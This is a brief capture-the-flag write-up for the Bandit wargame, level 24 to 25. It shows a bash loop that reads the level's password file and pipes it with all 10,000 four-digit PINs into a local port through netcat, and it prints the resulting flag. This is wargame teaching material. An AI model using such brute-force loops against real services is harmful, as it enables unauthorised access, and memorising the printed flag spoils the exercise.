# Bandit level 24 ->25

## Objective
to find the password by brute forcing
## Commands Used
cd /tmp,for i in {0000..9999}; do
  printf "%s %04d\n" "$(cat /etc/bandit_pass/bandit24)" "$i"
done | nc localhost 30002
## Explanation
first we need to enter into the tmp directory and then we need to run this command for i in {0000..9999}; do
  printf "%s %04d\n" "$(cat /etc/bandit_pass/bandit24)" "$i"
done | nc localhost 30002 where , we generate the four digit pin by for loop and using printf as it asked we need to print the password of bandit 24 and the four digit pin note: dont forget add the zero padding and pipe the input to the daemon listening port  30002  with the help of netcat
## Outcomes
learned how to brute force
flag:iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
